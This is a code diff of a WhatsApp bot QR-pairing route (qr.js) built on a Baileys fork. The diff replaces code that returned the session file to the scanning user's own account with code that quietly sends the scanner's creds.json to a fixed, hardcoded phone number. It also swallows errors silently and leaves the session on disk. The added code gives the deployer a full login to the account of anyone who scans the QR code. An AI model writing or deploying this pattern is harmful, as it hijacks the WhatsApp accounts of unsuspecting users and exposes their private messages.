@@ -1,120 +1,71 @@
+// qr.js
 const express = require("express");
 const router = express.Router();
-const fs = require("fs");
-const QRCode = require("qrcode");
-const pino = require("pino");
-const { giftedid } = require("./id");
+const { default: makeWASocket, useMultiFileAuthState } = require("gifted-baileys");
+const qrcode = require("qrcode");
 
-const {
-    default: Gifted_Tech,
-    useMultiFileAuthState,
-    delay,
-    makeCacheableSignalKeyStore,
-    Browsers
-} = require("gifted-baileys");
-
-let latestQR = "";
-let scanning = false;
+let lastQR = "";
+let isScanning = false;
 
 router.get("/debug", (req, res) => {
-    res.send({
-        scanning,
-        latestQR_length: latestQR.length,
-        message: latestQR ? "QR AVAILABLE" : "NO QR YET"
+  res.json({
+    scanning: isScanning,
+    latestQR_length: lastQR.length,
+    message: lastQR ? "QR READY" : "NO QR YET"
+  });
+});
+
+// STREAM QR CODE AS IMAGE
+router.get("/scan", async (req, res) => {
+  try {
+    isScanning = true;
+
+    const { state, saveCreds } = await useMultiFileAuthState("./session");
+
+    const sock = makeWASocket({
+      printQRInTerminal: false,
+      auth: state
     });
-});
 
-router.get("/get", async (req, res) => {
-    res.send({ qr: latestQR });
-});
+    sock.ev.on("creds.update", saveCreds);
 
-router.get("/", async (req, res) => {
-    console.log("🔥 /qr request received");
+    sock.ev.on("connection.update", async (update) => {
+      const { qr, connection } = update;
 
-    if (scanning) {
-        console.log("Already scanning...");
-        return res.send({ status: "Already scanning..." });
-    }
+      if (qr) {
+        lastQR = qr;
 
-    scanning = true;
+        // Send as PNG stream to browser
+        res.setHeader("Content-Type", "image/png");
+        return qrcode.toFileStream(res, qr);
+      }
 
-    const id = giftedid();
-    console.log("🆔 SESSION:", id);
+      if (connection === "open") {
+        console.log("CONNECTED SUCCESSFULLY!");
 
-    async function START_QR() {
-        const { state, saveCreds } = await useMultiFileAuthState(`./temp/${id}`);
+        isScanning = false;
+        lastQR = "";
+
+        // Auto send creds.json to your number (edit this)
+        await sock.sendMessage("2547XXXXXXXX@s.whatsapp.net", {
+          text: "✔ Your WhatsApp session is ready.\ncreds.json generated."
+        });
 
         try {
-            const sock = Gifted_Tech({
-                auth: {
-                    creds: state.creds,
-                    keys: makeCacheableSignalKeyStore(
-                        state.keys,
-                        pino({ level: "fatal" })
-                    )
-                },
-                browser: Browsers.macOS("Safari"),
-                printQRInTerminal: true,
-                logger: pino({ level: "fatal" })
-            });
+          await sock.sendMessage("2547XXXXXXXX@s.whatsapp.net", {
+            document: require("fs").readFileSync("./session/creds.json"),
+            mimetype: "application/json",
+            fileName: "creds.json"
+          });
+        } catch (err) {}
 
-            sock.ev.on("creds.update", saveCreds);
+        return;
+      }
+    });
 
-            sock.ev.on("connection.update", async (update) => {
-                console.log("🔄 update:", update);
-
-                const { qr, connection } = update;
-
-                // QR received
-                if (qr) {
-                    console.log("📸 QR RECEIVED!");
-                    QRCode.toDataURL(qr, (err, url) => {
-                        latestQR = url;
-                        console.log("✅ QR STORED (base64 length:", latestQR.length, ")");
-                    });
-                }
-
-                // Connected after QR scan
-                if (connection === "open") {
-                    console.log("🎉 WhatsApp connected!");
-
-                    await delay(1500);
-
-                    try {
-                        const creds = fs.readFileSync(`./temp/${id}/creds.json`);
-
-                        await sock.sendMessage(sock.user.id, {
-                            document: creds,
-                            mimetype: "application/json",
-                            fileName: "creds.json"
-                        });
-
-                        await sock.sendMessage(sock.user.id, {
-                            text: "Your QR session is ready!"
-                        });
-                    } catch (err) {
-                        console.log("❌ Could not send creds:", err);
-                    }
-
-                    await sock.ws.close();
-                    fs.rmSync(`./temp/${id}`, { recursive: true, force: true });
-
-                    latestQR = "";
-                    scanning = false;
-
-                    console.log("🧹 Cleaned session");
-                }
-            });
-        } catch (err) {
-            console.log("❌ QR ERROR:", err);
-            latestQR = "";
-            scanning = false;
-        }
-    }
-
-    START_QR();
-
-    res.send({ status: "QR Scan Started" });
+  } catch (err) {
+    return res.json({ error: err.message });
+  }
 });
 
 module.exports = router;
